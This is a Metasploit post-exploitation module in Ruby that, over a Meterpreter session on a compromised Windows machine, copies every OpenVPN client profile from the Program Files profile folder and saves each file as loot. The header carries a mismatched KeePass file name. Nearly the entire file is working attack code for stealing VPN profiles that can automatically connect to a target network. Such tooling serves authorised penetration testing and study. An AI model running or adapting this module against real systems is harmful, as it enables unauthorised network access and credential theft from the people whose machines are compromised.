# $Id: keepass_jacker.rb 2012-05-01 rapid7 $

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/user_profiles'

class Metasploit3 < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OpenVPN Profile Downloader',
        'Description'   => %q{
          This module downloads OpenVPN Profiles that can be imported into the OpenVPN client to automatically connect to a VPN.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'balgan <balgan[at]ptcoresec.eu>'],
        'Version'       => '$Revision: 3195e713 $',
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  def run
    arch = client.sys.config.sysinfo["Architecture"]
    print_status("Checking if folder exists...")
    if arch == "x86"
      dir = "C:\\Program Files\\OpenVPN Technologies\\OpenVPN Client\\etc\\profile\\"
      begin
        session.fs.dir.entries(dir)
        jack_openvpnprofiles(dir)
      rescue
        print_error("Path seems invalid: #{dir}")
        return nil
      end
    else
      dir = "C:\\Program Files (x86)\\OpenVPN Technologies\\OpenVPN Client\\etc\\profile\\"
      begin
        session.fs.dir.entries(dir)
        jack_openvpnprofiles(dir)
      rescue
        print_error("Path seems invalid: #{dir}")
        return nil
      end
      
    end
  end

  def jack_openvpnprofiles(folder)
    print_status("OpenVPN Profiles Folder Found at:  #{folder}")
    print_status("Retrieving Profile Files...")
    files = [""]
    files = client.fs.dir.entries(folder)
    print_status("#{files}")
    files.each do |f|
    begin
      path = folder + f
      print_status("CURRENT PATH #{path}")
      data = ""
          next if f =~/^(\.+)$/
        begin
        filesaving = session.fs.file.new(path, "rb")
        until filesaving.eof?
          data << filesaving.read
        end
        store_loot("#{f}", "text/plain", session, data, f, "loot #{path}")
      rescue ::Interrupt
        raise $!
      rescue ::Exception => e
        print_error("Failed to download #{path}: #{e.class} #{e}")
      end
      end
    end
    end

  end